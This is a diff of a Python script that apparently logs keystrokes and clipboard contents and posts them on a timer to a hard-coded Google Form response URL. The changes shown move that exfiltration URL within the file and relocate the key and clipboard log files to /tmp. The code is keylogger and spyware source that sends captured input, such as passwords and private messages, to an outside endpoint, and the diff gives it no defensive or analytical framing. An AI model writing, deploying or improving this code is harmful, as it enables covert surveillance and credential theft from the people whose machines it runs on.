@@ -10,25 +10,24 @@ import pyperclip
 import multiprocessing
 
 
-# You might want to do "sudo apt install xsel" inorder for pyperclip to work
+# Edit the url also edit fields in post_form function
+google_form_url = "https://docs.google.com/forms/d/e/1FAIpQLSdX1isUEfIf3rI2efwZwkucW73HAvlPXuXqQJ4udzvlWg_d7w/formResponse"
+
 # customize the time (in secs)
 wait_time_to_post = 30
 wait_time_to_listen_clip = 1
-
-# Edit the url also edit fields in post_form function
-google_form_url = "https://docs.google.com/forms/d/e/1FAIpQLSdX1isUEfIf3rI2efwZwkucW73HAvlPXuXqQJ4udzvlWg_d7w/formResponse"
 
 keys_lock = ''
 clip_lock = ''
 
 log_keys_file = os.environ.get(
 	'zero-key-score-key',
-	os.path.expanduser('~/file_keys.log')
+	os.path.expanduser('/tmp/file_keys.log')
 )
 
 log_clip_file = os.environ.get(
 	'zero-key-score-clip',
-	os.path.expanduser('~/file_clip.log')
+	os.path.expanduser('/tmp/file_clip.log')
 )
 
 
